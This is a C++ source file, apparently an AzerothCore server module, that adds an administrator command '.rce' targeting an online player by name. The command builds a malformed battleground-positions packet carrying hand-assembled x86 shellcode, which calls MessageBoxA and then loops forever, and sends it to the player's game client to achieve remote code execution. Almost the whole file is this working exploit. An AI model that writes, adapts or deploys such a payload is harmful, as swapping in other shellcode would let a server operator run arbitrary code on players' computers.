#include "ScriptMgr.h"
#include "Chat.h"
#include "Player.h"
#include "WorldSession.h"
#include "ByteBuffer.h"
#include "WorldPacket.h"
#include "ObjectAccessor.h"

using namespace Acore::ChatCommands;

class RCECommandScript : public CommandScript
{
public:
    RCECommandScript() : CommandScript("RCECommandScript") {}

    ChatCommandTable GetCommands() const override
    {
        static ChatCommandTable commandTable =
        {
            { "rce", HandleRCECommand, SEC_ADMINISTRATOR, Console::No }
        };
        return commandTable;
    }

    static bool HandleRCECommand(ChatHandler* handler, std::string const& playerName)
    {
        if (playerName.empty())
        {
            handler->SendSysMessage("Usage: .rce <charactername>");
            handler->SetSentErrorMessage(true);
            return false;
        }

        std::string name = playerName;
        if (!normalizePlayerName(name))
        {
            handler->SendSysMessage("Invalid player name.");
            handler->SetSentErrorMessage(true);
            return false;
        }

        Player* target = ObjectAccessor::FindPlayerByName(name);
        if (!target)
        {
            handler->PSendSysMessage("Player '{}' not found or not online.", name.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        WorldSession* session = target->GetSession();
        if (!session)
        {
            handler->SendSysMessage("Could not retrieve session for target player.");
            handler->SetSentErrorMessage(true);
            return false;
        }
		
		const uint8 test[] = {
		// push 0x00000000
		// 4th argument to MessageBoxA: uType = MB_OK
		0x68, 0x00, 0x00, 0x00, 0x00,

		// push 0x00DD1019
		// Pointer to caption string: "Proof"
		0x68, 0x19, 0x10, 0xDD, 0x00,

		// push 0x00DD101F
		// Pointer to text string: "RCE PoC"
		0x68, 0x1F, 0x10, 0xDD, 0x00,

		// push 0x00
		// hWnd = NULL
		0x6A, 0x00,

		// call dword ptr [0x009DF5CC]
		// Indirect call to MessageBoxA imported from USER32.dll
		0xFF, 0x15, 0xCC, 0xF5, 0x9D, 0x00,

		// jmp $
		// Infinite loop after the call returns
		0xEB, 0xFE,

		// "Proof\0"
		// Caption string
		0x50, 0x72, 0x6F, 0x6F, 0x66, 0x00,

		// "RCE PoC\0"
		// Message text string
		0x52, 0x43, 0x45, 0x20, 0x50, 0x6F, 0x43, 0x00,

		// Extra null terminator / padding
		0x00
		};

        ByteBuffer buff2;
        buff2 << uint32(0);
        buff2 << uint32(249298 + 5);

        int32 count = 40;
        while (count > 0)
        {
            for (int32 i = 0; i < 8; i++)
            {
                buff2 << test[count - 8 + i];
            }
            count -= 8;
            buff2 << uint32(0);
            buff2 << uint32(0);
        }

        WorldPacket pkt3(MSG_BATTLEGROUND_PLAYER_POSITIONS, buff2.size());
        pkt3.append(buff2);
        session->SendPacket(&pkt3);

        handler->PSendSysMessage("RCE payload dispatched to '{}'.", name.c_str());
        return true;
    }
};

void Addmod_rceScripts()
{
    new RCECommandScript();
}
